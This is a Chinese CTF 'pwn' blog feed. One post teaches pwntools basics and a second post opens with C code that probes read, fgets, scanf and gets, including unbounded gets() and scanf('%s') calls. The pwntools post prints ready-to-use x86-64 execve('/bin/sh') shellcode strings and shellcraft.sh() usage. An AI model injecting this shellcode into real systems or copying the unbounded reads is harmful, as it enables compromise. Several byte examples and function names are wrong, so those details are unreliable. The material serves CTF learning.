title="导入pwntools:"></a>导入pwntools:</h4><p>这大概会是每一个pwn手的编写脚本时的第一句话</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * <span class="comment">#使用from来导入pwntools模块</span></span><br></pre></td></tr></table></figure><h4 id="设置基本信息"><a href="#设置基本信息" class="headerlink" title="设置基本信息:"></a>设置基本信息:</h4><p>在打靶机前需要按照靶机的类型设置好基本信息,因为<code>pwntools</code>中很多工具需要依靠<code>contest</code>来自动选择类型，比如<code>shellcraft(用于生成shellcode代码的工具)</code>等<br><code>os</code>是靶机的系统类型一般就是<code>linux系统</code><br><code>arch</code>是指题目的架构,我们可以使用<code>checksec</code>工具来查看具体的架构，一般是<code>AMD64</code>或<code>i386</code><br><code>log_level</code>是指日志输出等级，可以设置为<code>debug</code>或者直接不设置删掉也行，设置为debug在脚本运行的时候会输出我们具体发送了什么信息，靶机反馈了什么信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;AMD64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="连接远程靶机"><a href="#连接远程靶机" class="headerlink" title="连接远程靶机:"></a>连接远程靶机:</h4><p>在pwn(1.0.0)中曾经介绍过，我们启动靶机后会得到一个靶机地址，把靶机地址的前缀和端口分别输入在<code>remote</code>里面，<code>ip</code>用<code>&#39;&#39;</code>包裹起来用逗号隔开<code>端口</code>，这样就实现了远程连接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用于连接远程服务器，并把连接到的进程命名为p，后续的函数都围绕这个p进程展开</span><br><span class="line">p = remote(<span class="string">&quot;ip&quot;</span>,port) </span><br><span class="line">比如:p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">5555</span>)</span><br></pre></td></tr></table></figure><p>当然偶尔也有题目需要用ssh来连接靶机的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过使用ssh来连接靶机</span><br><span class="line">p = ssh(host=<span class="string">&#x27;192.168.xx.xxx&#x27;</span>, user=<span class="string">&#x27;xidp&#x27;</span>, port=<span class="number">6666</span>, password=<span class="string">&#x27;88888888&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="本地调试"><a href="#本地调试" class="headerlink" title="本地调试:"></a>本地调试:</h4><p>在远程之前，我们可以在本地先进行一些测试,那么我们可以本地运行文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">本地调试程序,并且将进程命名为p</span><br><span class="line">p = process(<span class="string">&quot;文件名&quot;</span>)</span><br><span class="line">比如:p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="发送信息"><a href="#发送信息" class="headerlink" title="发送信息:"></a>发送信息:</h4><p>假设我们需要发送的是<code>payload</code>这个变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">**************************************************</span><br><span class="line">p.send(payload) <span class="comment"># 直接发送payload</span></span><br><span class="line">**************************************************</span><br><span class="line">p.sendline(payload) <span class="comment"># 发送payload，但是结尾会有一个\n</span></span><br><span class="line">**************************************************</span><br><span class="line">p.sendafter(<span class="string">&quot;string&quot;</span>, payload) <span class="comment"># 接收到 string (这里说的string可以替换成任何信息) 之后会发送payload，但是如果没有接收到string，那么就会导致脚本一直卡在这里不动</span></span><br><span class="line">**************************************************</span><br><span class="line">p.sendlineafer(<span class="string">&quot;string&quot;</span>, payload) <span class="comment"># 接收到 string 之后会发送payload 并且在payload最后添加\n</span></span><br></pre></td></tr></table></figure><p>一般常用的发送就这几种，此时可能会有一个疑问，<code>p.send</code> 和 <code>p.sendline</code> 就差一个<code>\n</code>有什么区别?<br>有区别，比如<code>gets()</code>和<code>scanf()</code>这类函数它们会以<code>\n</code>作为结束符号，如果我们没有发送<code>\n</code>,它们就会一直卡着等待输入，所以遇到这类输入函数就必须要用<code>p.sendline</code>来添加<code>\n</code>(当然如果我们手动在payload里面添加<code>\n</code>也OK)。遇到<code>read()</code>这类函数则使用<code>p.sendline</code>和<code>p.send</code>都可以.</p><p>那如果我们都使用<code>p.sendline</code>不就好了吗? NO，这并不好，比如我们遇到<code>read()</code>并且希望发送一些字符串比如<code>&quot;flag&quot;</code>,如果你用<code>p.send(&quot;flag&quot;)</code>那么没错你发送的是<code>flag</code>，计算机解析后是<code>\x67\x61\x6C\x66</code>，而如果你用的是<code>p.sendline(&quot;flag&quot;)</code>，则你发送的是<code>flag\n</code>,计算机解析后是<code>\x0a\x67\x61\x6C\x66</code>,这一点细节上的差距就可能导致我们的脚本无法打通，所以我们需要面对合适的函数使用合适的方法，后续我们将会继续讨论<code>read()、scanf()、fgets()和gets()</code>这类函数在输入的时候具体有什么区别</p><h4 id="接收信息"><a href="#接收信息" class="headerlink" title="接收信息:"></a>接收信息:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">**************************************************</span><br><span class="line">p.recv(<span class="built_in">int</span>) 利用recv来接收返回的数据，并且可以控制接受到的字节数</span><br><span class="line">比如:p.recv(<span class="number">7</span>) =&gt; 系统输出<span class="string">&#x27;hello world&#x27;</span> =&gt; 我们会接受到<span class="string">&#x27;hello w&#x27;</span> </span><br><span class="line">**************************************************</span><br><span class="line">p.recvline(<span class="string">&#x27;string&#x27;</span>) 设置一个标识符，接收标识符所在的那一行</span><br><span class="line">比如:p.recvline(<span class="string">&#x27;O.o&#x27;</span>)</span><br><span class="line"><span class="comment">#系统输出:</span></span><br><span class="line">Hello World </span><br><span class="line">This <span class="keyword">is</span> a test. </span><br><span class="line">O.o This <span class="keyword">is</span> the target line. </span><br><span class="line">Goodbye.</span><br><span class="line"><span class="comment">#我们接收:</span></span><br><span class="line">O.o This <span class="keyword">is</span> the target line. </span><br><span class="line">**************************************************</span><br><span class="line">p.recvlines(N) 接收 N 行输出</span><br><span class="line">**************************************************</span><br><span class="line">p.recvuntil(<span class="string">&#x27;string&#x27;</span>) 可以指定接收到某一字符串的时候停止 ,还有第二个参数 drop，drop=<span class="literal">True</span>(默认为false) 表示丢弃设定的停止符号</span><br><span class="line">比如:p.recvuntil(<span class="string">&#x27;or&#x27;</span>) </span><br><span class="line"><span class="comment">#系统输出:</span></span><br><span class="line">hello world </span><br><span class="line"><span class="comment">#我们接收:</span></span><br><span class="line">hello wor  </span><br><span class="line">比如:a = io.recvuntil(<span class="string">&#x27;]&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">就是一直获取到`]`符号出现就停止，并且不接收`]`符号</span><br><span class="line">**************************************************</span><br></pre></td></tr></table></figure><h4 id="传递到终端"><a href="#传递到终端" class="headerlink" title="传递到终端:"></a>传递到终端:</h4><p>大概是每个脚本的最后一句话</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.interactive()</span><br><span class="line">接受信息并且在终端操作，程序拿到shell，然后就可以转接到linux终端上，让pwn手享受拿flag的乐趣</span><br></pre></td></tr></table></figure><h4 id="构造发送地址类型"><a href="#构造发送地址类型" class="headerlink" title="构造发送地址类型:"></a>构造发送地址类型:</h4><p><code>p64/p32/u64/u32</code>这类函数的作用:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">**************************************************</span><br><span class="line">p64(<span class="built_in">int</span>) </span><br><span class="line">p64(<span class="number">0xfaceb00c</span>) =&gt; <span class="string">&#x27;\x0c\xb0\xce\xfa\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">**************************************************</span><br><span class="line">u64(<span class="built_in">str</span>) </span><br><span class="line">u64(<span class="string">&#x27;\x0c\xb0\xce\xfa\x00\x00\x00\x00&#x27;</span>) =&gt;<span class="number">0xfaceb00c</span></span><br><span class="line">**************************************************</span><br><span class="line">p32(<span class="built_in">int</span>)  </span><br><span class="line">p32(<span class="number">0xfaceb00c</span>) =&gt; <span class="string">&#x27;\x0c\xb0\xce\xfa&#x27;</span></span><br><span class="line">**************************************************</span><br><span class="line">u32(<span class="built_in">str</span>) </span><br><span class="line">u32(<span class="string">&#x27;\x0c\xb0\xce\xfa&#x27;</span>) =&gt; <span class="number">0xfaceb00c</span></span><br><span class="line">**************************************************</span><br></pre></td></tr></table></figure><p><code>p64()</code>这种类型用于将消息变成对应的进制流（因为原本程序里面的数据都是已经编译过的，所以打入的数据也需要是编译过的,所以需要使用p64()这类工具）<br><code>u64()</code>这种类型<code>用于泄露地址</code>的时候将泄露的进制流变成对应的原本的样子，方便来辨认查找glibc版本</p><p>因为一般计算机都是小端程序，所以这两个函数都自带有将数据变成小端需要的样子，如果遇到大端程序可能需要额外注意</p><p> 除了<code>p32()</code>这种转化方式还有，<code>flat()</code>，它可以将多个数据结构（如字符串、整数等）连接在一起，并将它们转换为二进制数据。通常用于构建复杂的ROP链的<code>shellcode</code>。flat 函数会将数据扁平化，将它们按照顺序连接在一起，不做任何其他处理。在提供的代码中，<code>flat</code> 被用于构建一个包含多个元素的列表，然后将它们连接起来形成一个二进制数据。<br> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([<span class="number">0x12345678</span>, <span class="string">&#x27;AAAA&#x27;</span>, <span class="number">0xdeadbeef</span>], word_size=<span class="number">4</span>/<span class="number">8</span>)</span><br></pre></td></tr></table></figure></p><h4 id="的汇编与反汇编"><a href="#的汇编与反汇编" class="headerlink" title="的汇编与反汇编:"></a>的汇编与反汇编:</h4><p>pwntools提供了两个工具:<br><code>asm</code>函数可以将汇编代码转为对应的二进制<br><code>disasm</code>函数则相反可以将二进制转化为汇编代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">&#x27;mov eax, 0&#x27;</span>)   <span class="comment">#汇编</span></span><br><span class="line"><span class="string">&#x27;\xb8\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>disasm(<span class="string">&#x27;\xb8\x0b\x00\x00\x00&#x27;</span>)  <span class="comment">#反汇编</span></span><br><span class="line"><span class="string">&#x27;mov    eax,0xb&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="生成shllcode后门"><a href="#生成shllcode后门" class="headerlink" title="生成shllcode后门:"></a>生成shllcode后门:</h4><p><strong>pwnlib.shellcraft模块</strong>包含<strong>生成shell代码</strong>的函数。<br>在使用之前我们需要通过<strong>context设置架构</strong>，然后<strong>生成shellcode</strong>也就是生成后门</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="comment"># 表示将当前执行上下文的体系结构设置为i386(这里的i386可以通过checksec来查看文件是什么架构的  </span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># asm()是把括号内的内容编译成机器码(只有机器码才可以执行)，一般用来打入后门。pwntools自带的后门函数，可以生成类似system(&#x27;/bin/sh/&#x27;)这样功能的汇编代码 </span></span><br><span class="line"><span class="comment"># 通常可以配合  .ljust() 来使用  </span></span><br><span class="line">shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>)  </span><br><span class="line"><span class="comment"># 这里的 .ljust() 是 Python 中字符串对象的方法，用于在字符串的右侧填充指定的字符，使字符串达到指定的长度。</span></span><br></pre></td></tr></table></figure><p>纯净版shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>)  </span><br></pre></td></tr></table></figure><p>当然也有专门的网站收集shellcode<br>shellcode的网址：<br> <a href="https://www.exploit-db.com/shellcodes/43550">https://www.exploit-db.com/shellcodes/43550</a><br>下面也提供一些已经编译好的shellcode:<br>64位linux的24Byte的shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode_x64 =<span class="string">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span></span><br></pre></td></tr></table></figure><p>64位Linux的23Byte的shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode_x64 =<span class="string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br></pre></td></tr></table></figure><p>更多的时候根据题目的要求，我们需要自己手动编写shellcode来绕过一些检测，所以编写<code>shellcode</code>是后续必须要掌握的一种技巧</p><p>运行时调用gdb调试:<br>使用<code>gdb.attach</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(p, gdbscript=<span class="string">&quot;&quot;&quot; b main; commands; silent printf &quot;Breakpoint hit\n&quot;; continue; end &quot;&quot;&quot;</span>)</span><br><span class="line">在需要进行调试的位置插入gdb.attach(p)即可在执行到的时候打开gdb进行调试</span><br><span class="line">p是指定的需要调试的进程(必须要本地调试，否则会报错)</span><br><span class="line">gdbscript是打开gdb后需要进行的操作，使用 ; 进行隔离</span><br></pre></td></tr></table></figure><p>一般<code>gdb.attach(p)</code>可以和<code>pause()</code>函数连用，可以确保在gdb完全打开之前脚本不运行<br><code>pause()</code>函数用于暂停脚本的运行，直到用户输入任意数据</p><h4 id="ELF模块"><a href="#ELF模块" class="headerlink" title="ELF模块:"></a>ELF模块:</h4><p>我们可以通过这个模块来快速获取pwn文件的<code>got表地址</code>以及<code>plt表地址</code><br>用于获取<code>ELF文件的信息</code>，首先使用<code>ELF()</code>获取这个文件的句柄，然后使用这个句柄调用函数，和IO模块很相似。<br>下面演示了：获取基地址、获取函数地址（基于符号）、获取函数got地址、获取函数plt地址，和LibcSearcher库联动使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf.address <span class="comment"># 文件装载的基地址 =&gt; 0x400000</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>] <span class="comment"># 获取函数地址 =&gt; 0x401680</span></span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>] <span class="comment"># 获取对应函数在GOT表的地址 =&gt; 0x60b070</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>] <span class="comment"># 获取对应函数在PLT表的地址 =&gt; 0x401680</span></span><br></pre></td></tr></table></figure><p>参考文献:<br><a href="https://www.yuque.com/cyberangel/rg9gdm/uqazzg">PWN入门（1-1-5）-pwntools学习 (yuque.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> 基础知识 </category>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不同输入函数之间的区别</title>
      <link href="/2024/06/13/%E4%B8%8D%E5%90%8C%E8%BE%93%E5%85%A5%E5%87%BD%E6%95%B0%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2024/06/13/%E4%B8%8D%E5%90%8C%E8%BE%93%E5%85%A5%E5%87%BD%E6%95%B0%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文涉及 <code>read函数</code> <code>fgets函数</code> <code>scanf函数</code> 以及 <code>gets函数</code> 获取字符串后内存的区别，以及在pwntools中使用 <code>sendline</code> 和 <code>send</code> 的区别。实验过程有些冗长，嫌麻烦的师傅可以直接查看下面的总结</p><p>实验目标</p><ol><li><code>read</code> <code>fgets</code> <code>scanf</code> 这种可以限定大小的输入，如果输入量小于&#x2F;等于&#x2F;大于它们的输入量分别会出现什么情况</li><li><code>scanf(&quot;%s&quot;，&amp;buf)</code>这种情况是否存在溢出</li><li><code>gets</code> 输入是怎么处理<code>\n</code>符号的</li></ol><p>下面是我实验用的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> bss[<span class="number">8</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="type">char</span> *ptr[<span class="number">13</span>];</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 初始化bss数组</span></span><br><span class="line">    <span class="built_in">memset</span>(bss, <span class="number">0x22</span>, <span class="keyword">sizeof</span>(bss)*<span class="number">3</span>);</span><br><span class="line">    <span class="comment">// 利用循环申请12个0x30大小的堆块，并将对应地址存储在ptr这个指针数组里面</span></span><br><span class="line">    <span class="comment">// 如果申请失败则直接退出程序</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">13</span>; i++) &#123;</span><br><span class="line">        ptr[i] = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">if</span> (!ptr[i]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不用在意，只是gdb调试时方便跳转的标记</span></span><br><span class="line">    sleep(<span class="number">0.1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用memset将堆块的内容设置为\x22,为了方便我们区分哪些是我们输入的东西</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">13</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(ptr[i], <span class="number">0x22</span>, <span class="number">0x30</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">0.1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里free是因为free之后的堆块在pwndbg里面显示绿绿的，方便进行区分不同函数输入</span></span><br><span class="line">    <span class="built_in">free</span>(ptr[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">free</span>(ptr[<span class="number">7</span>]);</span><br><span class="line">    <span class="built_in">free</span>(ptr[<span class="number">11</span>]);</span><br><span class="line">    sleep(<span class="number">0.1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// step 1 测试read函数，限定输入大小为8字节，查看分别输入 a*6 a*8 a*10 后内存的样子</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;read a*6\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, ptr[<span class="number">0</span>], <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; getchar() != EOF); <span class="comment">// 为了防止残留的\x0a影响后续的输入，这里采用了getchar来把多余的\x0a吃掉</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;read a*8\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, ptr[<span class="number">1</span>], <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; getchar() != EOF);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;read a*10\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, ptr[<span class="number">2</span>], <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; getchar() != EOF);</span><br><span class="line">    sleep(<span class="number">0.1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// step 2 测试fgets函数，限定输入大小为8字节，查看分别输入 a*6 a*8 a*10 后内存的样子</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fgets a*6\n&quot;</span>);</span><br><span class="line">    fgets(ptr[<span class="number">4</span>], <span class="number">8</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; getchar() != EOF);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fgets a*8\n&quot;</span>);</span><br><span class="line">    fgets(ptr[<span class="number">5</span>], <span class="number">8</span>, <span class="built_in">stdin</span>);    </span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; getchar() != EOF);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fgets a*10\n&quot;</span>);</span><br><span class="line">    fgets(ptr[<span class="number">6</span>], <span class="number">8</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; getchar() != EOF);</span><br><span class="line">    sleep(<span class="number">0.1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// step 3 测试scanf函数，限定输入的字符串大小为8字节，查看分别输入 a*6 a*8 a*10 后内存的样子</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;scanf a*6\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%8s&quot;</span>, ptr[<span class="number">8</span>]);</span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; getchar() != EOF);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;scanf a*8\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%8s&quot;</span>, ptr[<span class="number">9</span>]);</span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; getchar() != EOF);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;scanf a*10\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%8s&quot;</span>, ptr[<span class="number">10</span>]);</span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; getchar() != EOF);</span><br><span class="line">    sleep(<span class="number">0.1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// step 4 测试gets函数输入之后是什么样子的，仅输入一次，输入6个字节的a</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gets a*6\n&quot;</span>);</span><br><span class="line">    gets(ptr[<span class="number">12</span>]);</span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; getchar() != EOF);</span><br><span class="line">    sleep(<span class="number">0.1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测试scanf(&quot;%s&quot;,bss)是否存在溢出</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,bss);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,bss);</span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; getchar() != EOF);</span><br><span class="line">    sleep(<span class="number">0.1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面我们开始测试:</p><h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p><img src="/../picture/talk1.0.0/1.png"><br>开头在sleep上打断点，方便我们后续使用c快速跟进，查看到bss全局变量在 <code>0x555555558050</code> 这个位置上</p><p>来到第一个sleep所在的地方<br>查看bss段里面是什么，可以看到已经都变成22了，后面输入后改变我们就可以直观的看到<br><img 